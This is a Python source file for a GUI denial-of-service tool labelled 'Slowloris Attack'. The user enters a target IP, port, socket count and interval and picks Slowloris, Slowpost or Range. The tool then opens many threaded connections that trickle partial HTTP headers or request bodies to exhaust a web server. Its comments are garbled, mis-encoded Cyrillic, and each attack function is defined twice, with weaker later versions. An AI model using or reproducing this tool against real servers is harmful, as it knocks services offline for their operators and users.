import customtkinter as ctk
import socket
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor

# –û—á–∏—Å—Ç–∫–∞ —Ñ—Ä–µ–π–º–∞ –æ—Ç –≤—Å–µ—Ö –≤–∏–¥–∂–µ—Ç–æ–≤
def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—è –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ–º —Ä–µ–∂–∏–º–µ
def update_text_box(text_box, message):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—è –∏–∑ –ø–æ—Ç–æ–∫–∞"""
    text_box.after(0, lambda: text_box.insert("end", message + "\n"))
    text_box.after(0, lambda: text_box.yview("end"))  # –ü—Ä–æ–∫—Ä—É—á–∏–≤–∞–µ–º –≤–Ω–∏–∑

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è UI
def slowloris_ui(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)  # –û—á–∏—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–¥ —Å–æ–∑–¥–∞–Ω–∏–µ–º UI

    # –ó–∞–≥–æ–ª–æ–≤–æ–∫
    title = ctk.CTkLabel(parent_frame, text="Slowloris Attack üíÄ", font=("Arial", 24))
    title.place(relx=0.5, rely=0.1, anchor="center")

    # –ü–æ–ª–µ –≤–≤–æ–¥–∞ –¥–ª—è IP-–∞–¥—Ä–µ—Å–∞
    ip_label = ctk.CTkLabel(parent_frame, text="IP Address:", font=("Arial", 16))
    ip_label.place(relx=0.3, rely=0.3, anchor="center")
    ip_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    ip_entry.place(relx=0.7, rely=0.3, anchor="center")

    # –ü–æ–ª–µ –≤–≤–æ–¥–∞ –¥–ª—è –ø–æ—Ä—Ç–∞
    port_label = ctk.CTkLabel(parent_frame, text="Port:", font=("Arial", 16))
    port_label.place(relx=0.3, rely=0.4, anchor="center")
    port_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    port_entry.place(relx=0.7, rely=0.4, anchor="center")

    # –ü–æ–ª–µ –≤–≤–æ–¥–∞ –¥–ª—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —Å–æ–∫–µ—Ç–æ–≤
    sockets_label = ctk.CTkLabel(parent_frame, text="Sockets:", font=("Arial", 16))
    sockets_label.place(relx=0.3, rely=0.5, anchor="center")
    sockets_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    sockets_entry.place(relx=0.7, rely=0.5, anchor="center")

    # –ü–æ–ª–µ –≤–≤–æ–¥–∞ –¥–ª—è –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞
    interval_label = ctk.CTkLabel(parent_frame, text="Interval (sec):", font=("Arial", 16))
    interval_label.place(relx=0.3, rely=0.6, anchor="center")
    interval_entry = ctk.CTkEntry(parent_frame, width=200, font=("Arial", 16))
    interval_entry.place(relx=0.7, rely=0.6, anchor="center")

    # –ü–æ–ª–µ –≤—ã–±–æ—Ä–∞ –º–µ—Ç–æ–¥–∞ –∞—Ç–∞–∫–∏
    method_atack_label = ctk.CTkLabel(parent_frame, text="Method of attack:", font=("Arial", 16))
    method_atack_label.place(relx=0.3, rely=0.7, anchor="center")
    method_atack = ctk.CTkComboBox(parent_frame, values=["Slowloris", "Slowpost", "Range"], font=("Arial", 16), width=200)
    method_atack.place(relx=0.7, rely=0.7, anchor="center")

    # –ö–Ω–æ–ø–∫–∞ –∑–∞–ø—É—Å–∫–∞ –∞—Ç–∞–∫–∏
    start_btn = ctk.CTkButton(
        parent_frame, 
        text="Start Attack", 
        fg_color="black", 
        border_color="#8d33ff", 
        hover_color="#2a104c", 
        border_width=2, 
        font=("Arial", 16), 
        command=lambda: start_attack(ip_entry.get(), port_entry.get(), sockets_entry.get(), interval_entry.get(), parent_frame, method_atack.get()), 
        width=parent_frame.winfo_width() * 0.7, 
        height=40
    )
    start_btn.place(relx=0.5, rely=0.8, anchor="center")

    back_btn = ctk.CTkButton(
        parent_frame,
        text="‚Üê Back",
        command=go_back_callback,
        font=("Arial", 16),
        width=parent_frame.winfo_width() * 0.7,
        height=40,
        fg_color="black", 
        border_color="#8d33ff", 
        hover_color="#2a104c", 
        border_width=2
    )
    back_btn.place(relx=0.5, rely=0.9, anchor="center")

    # Textbox –¥–ª—è –≤—ã–≤–æ–¥–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
    # text_box = ctk.CTkTextbox(parent_frame, width=parent_frame.winfo_width() * 0.7, height=70, font=("Arial", 12))
    # text_box.place(relx=0.5, rely=0.85, anchor="center")

# –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∞—Ç–∞–∫
# –†–µ–∞–ª–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫–∏ Slowloris
def slowloris_socket(target, port, interval, stop_event, text_box):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        update_text_box(text_box, f"[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ {target}:{port}")

        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: slowloris-test\r\n".encode())
        s.send("Content-Length: 10000\r\n".encode())

        while not stop_event.is_set():
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                update_text_box(text_box, "[~] –ó–∞–≥–æ–ª–æ–≤–æ–∫ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω...")
                time.sleep(interval)
            except socket.error as e:
                update_text_box(text_box, f"[!] –û—à–∏–±–∫–∞ —Å–æ–∫–µ—Ç–∞: {e}")
                break
    except Exception as e:
        update_text_box(text_box, f"[!] –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")
    finally:
        s.close()
        update_text_box(text_box, "[*] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ")

# –†–µ–∞–ª–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫–∏ Slowpost
def slowpost_socket(target, port, interval, stop_event, text_box):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        update_text_box(text_box, f"[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ {target}:{port}")

        s.send(f"POST / HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: slowpost-test\r\n".encode())
        s.send("Content-Length: 10000\r\n\r\n".encode())

        while not stop_event.is_set():
            s.send(f"{random.randint(1,9)}".encode())
            update_text_box(text_box, "[~] –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–ª–∞ –∑–∞–ø—Ä–æ—Å–∞...")
            time.sleep(interval)

    except Exception as e:
        update_text_box(text_box, f"[!] –û—à–∏–±–∫–∞: {e}")
    finally:
        s.close()
        update_text_box(text_box, "[*] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ")

# –†–µ–∞–ª–∏–∑–∞—Ü–∏—è –∞—Ç–∞–∫–∏ Range
def range_socket(target, port, interval, stop_event, text_box):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        update_text_box(text_box, f"[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ {target}:{port}")

        s.send(f"GET / HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: range-test\r\n".encode())
        s.send("Range: bytes=0-0\r\n\r\n".encode())

        while not stop_event.is_set():
            s.send(f"X-range: keep\r\n".encode())
            update_text_box(text_box, "[~] Range-–∑–∞–ø—Ä–æ—Å –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç—Å—è...")
            time.sleep(interval)

    except Exception as e:
        update_text_box(text_box, f"[!] –û—à–∏–±–∫–∞: {e}")
    finally:
        s.close()
        update_text_box(text_box, "[*] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ")

# –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ —Å –≤—ã–±—Ä–∞–Ω–Ω—ã–º –º–µ—Ç–æ–¥–æ–º
def start_attack(target, port, sockets, interval, parent_frame, attack_method):
    try:
        target = str(target)
        port = int(port)
        sockets = int(sockets)
        interval = int(interval)

        #update_text_box(parent_frame.winfo_children()[-1], f"[~] –ê—Ç–∞–∫–∞ –Ω–∞ {target}:{port} —Å {sockets} —Å–æ–∫–µ—Ç–∞–º–∏ —á–µ—Ä–µ–∑ {interval} —Å–µ–∫—É–Ω–¥")

        # –í—ã–±–æ—Ä –º–µ—Ç–æ–¥–∞ –∞—Ç–∞–∫–∏
        attack_functions = {
            "Slowloris": slowloris_socket,
            "Slowpost": slowpost_socket,
            "Range": range_socket
        }

        attack_function = attack_functions.get(attack_method, slowloris_socket)

        # –ò—Å–ø–æ–ª—å–∑—É–µ–º ThreadPoolExecutor –¥–ª—è —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞–º–∏
        with ThreadPoolExecutor(max_workers=sockets) as executor:
            for _ in range(sockets):
                executor.submit(attack_function, target, port, interval, parent_frame)

    except Exception as e:
        pass
        #update_text_box(parent_frame.winfo_children()[-1], f"[!] –û—à–∏–±–∫–∞: {e}")

# –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è —Å–æ–∫–µ—Ç–æ–≤ (–∞—Ç–∞–∫—É—é—â–∏–µ –ø–æ—Ç–æ–∫–∏)
def slowloris_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        message = f"[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: {target}:{port}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: reconnect-test\r\n".encode("utf-8"))
        s.send("Content-Length: 10000\r\n".encode("utf-8"))

        time.sleep(interval)

    except Exception as e:
        message = f"[!] –û—à–∏–±–∫–∞: {e}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

    finally:
        s.close()
        #update_text_box(parent_frame.winfo_children()[-1], "[*] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ, –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫")

def slowpost_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        message = f"[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: {target}:{port}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

        s.send(f"POST / HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: reconnect-test\r\n".encode("utf-8"))
        s.send("Content-Length: 10000\r\n\r\n".encode("utf-8"))

        time.sleep(interval)

    except Exception as e:
        message = f"[!] –û—à–∏–±–∫–∞: {e}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

    finally:
        s.close()
        #update_text_box(parent_frame.winfo_children()[-1], "[*] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ, –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫")

def range_socket(target, port, interval, parent_frame):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        message = f"[+] –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: {target}:{port}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

        s.send(f"GET / HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: reconnect-test\r\n".encode("utf-8"))
        s.send("Range: bytes=0-0\r\n\r\n".encode("utf-8"))

        time.sleep(interval)

    except Exception as e:
        message = f"[!] –û—à–∏–±–∫–∞: {e}"
        #update_text_box(parent_frame.winfo_children()[-1], message)

    finally:
        s.close()
        #update_text_box(parent_frame.winfo_children()[-1], "[*] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ, –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫")